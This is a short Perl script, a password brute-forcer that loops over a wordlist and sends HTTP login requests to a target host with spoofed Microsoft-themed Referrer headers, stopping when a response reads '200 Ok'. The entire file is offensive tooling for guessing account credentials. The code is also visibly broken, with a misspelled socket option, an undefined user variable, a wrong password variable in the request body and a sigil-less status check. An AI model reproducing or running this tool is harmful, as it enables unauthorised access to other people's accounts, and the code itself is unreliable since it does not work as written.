use MIME::Base64;
use IO::Socket;
use POSIX;
use feature 'say';

$progname = 'bruteforcer';

if(@ARGV<2){
	die say "$progname: too few arguments";
}

$atk_str = $ARGV[0];
#parsing for arguments
$atk_str =~ /((\w+):\/\/)?(((\w+)\.)+(\w+))(:(\d+))?\/?((\w+)[\/]?)?/;
$proto		= $2;#protocol used to attack
$host		= $3;#atacked host
$port		= $8;#port of host to attack
$dir		= '/'.$9;#login directory
$login		= $ARGV[1];#login to attack
$wordlist	= $ARGV[2];#list of passwords to attack

say qq(
Attacking string: '$atk_str'
protocol:'$proto'
host:'$host'
port:$port
directory:'$dir'
login:'$login'
wordlist:'$wordlist'
);

open FILE, $wordlist or die say "$!";
@data = <FILE>;#read all strings from file
close FILE;

$buff = do{
	$string = '';
	for $x (@data){
		$string.=$x;
	}
	$string
};

@words = split "\n", $buff;#get words to attack
undef $buff;

$i = 0;
say "Starting attack...";
foreach $pass (@words){
	++$i;
	$auth=encode_base64 "$user:$pass"; chomp $auth;


	$socket = IO::Socket::INET->new(
		PeerAddr	=> $host,
		PeerPort	=> $port,
		Photo		=> tcp
	) or die say "Unable to connect to $host:$port";
	say "connected socket $i";

=head
	print $socket qq(GET $dir HTTP/1.1
	Host: $host
	Accept: */*
	Referrer: http://support.microsoft.com
	User-Agent: Internet Explorer 6.0
	Pragma: no-cache
	Cache-Control: no-cache
	Authorization: Basic $auth
	Connection: close
=cut
	print $socket qq(POST https://$host$dir HTTP/1.1
	Host: $host
	Referrer: https://suppotr.microsoft.com
	Content-Type: application/x-www-form-urlencoded
	Conent-Length: 25

	email=$login&$password=qq
	);#request to login

	$ans = <$socket>;
	say "Answer is '
	$ans'";
	if(ans =~/200 Ok/i){
		say "Found right combination:$login:pass";
		exit;
	}
};
say "Attack ended.";
exit;
